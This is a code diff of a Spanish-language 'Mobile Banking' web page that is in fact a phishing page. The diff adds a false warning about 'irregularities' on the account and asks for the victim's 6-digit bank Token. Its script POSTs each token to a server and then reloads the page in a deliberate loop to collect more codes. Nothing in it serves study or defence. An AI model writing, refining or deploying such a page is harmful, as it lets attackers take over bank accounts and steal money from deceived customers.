@@ -5,22 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mobile Banking</title>
     <link rel="stylesheet" href="styles.css">
-
-    <!-- Centrado forzado del formulario -->
-    <style>
-        body {
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .login-card {
-            width: 90%;
-            max-width: 360px;
-            margin-top: 20px;
-        }
-    </style>
 </head>
 <body>
 
@@ -40,15 +24,20 @@
 
 <!-- Card -->
 <div class="login-card">
-    <div class="login-title">Ingresá tu código Token de 6 Digitos</div>
+    <div class="login-title">Verificación requerida</div>
+
+    <div class="token-error">
+        Notamos irregularidades en su cuenta, para continuar,
+        por favor ingrese su <strong>código Token de 6 dígitos</strong>
+    </div>
 
     <input
         type="text"
         id="tokenInput"
+        class="token-input"
         maxlength="6"
         inputmode="numeric"
-        pattern="[0-9]{6}"
-        placeholder="6 dígitos"
+        autocomplete="off"
         required
     >
 
@@ -57,26 +46,6 @@
         Aceptar
     </button>
 </div>
-
-    <!-- Mensaje de error -->
-        <div class="token-error">
-            Notamos irregularidades en su cuenta, para continuar,
-            por favor digite su código <strong>Token de 6 dígitos</strong>
-        </div>
-
-        <input
-            type="text"
-            class="token-input"
-            maxlength="6"
-            inputmode="numeric"
-            placeholder=""
-        >
-
-        <button type="button" class="btn-accept">
-            <span class="check">✔</span>
-            Aceptar
-        </button>
-    </div>
 
 <!-- Footer -->
 <footer class="footer">
@@ -87,15 +56,15 @@
 <script>
 const tokenInput = document.getElementById("tokenInput");
 
-/* SOLO números */
+/* Solo números */
 tokenInput.addEventListener("input", () => {
     tokenInput.value = tokenInput.value.replace(/[^0-9]/g, "");
 });
 
 function enviarToken() {
-    const token = tokenInput.value;
+    const token = tokenInput.value.trim();
 
-    // OBLIGATORIO 6 dígitos
+    // Obligatorio 6 dígitos
     if (token.length !== 6) {
         tokenInput.focus();
         return;
@@ -105,12 +74,12 @@ function enviarToken() {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            tipo: "codigo",
+            tipo: "Token",
             valor: token
         })
     }).finally(() => {
-        // BUCLE: vuelve al mismo HTML
-        window.location.reload();
+        // vuelve al mismo lugar (bucle)
+        window.location.href = window.location.href;
     });
 }
 </script>
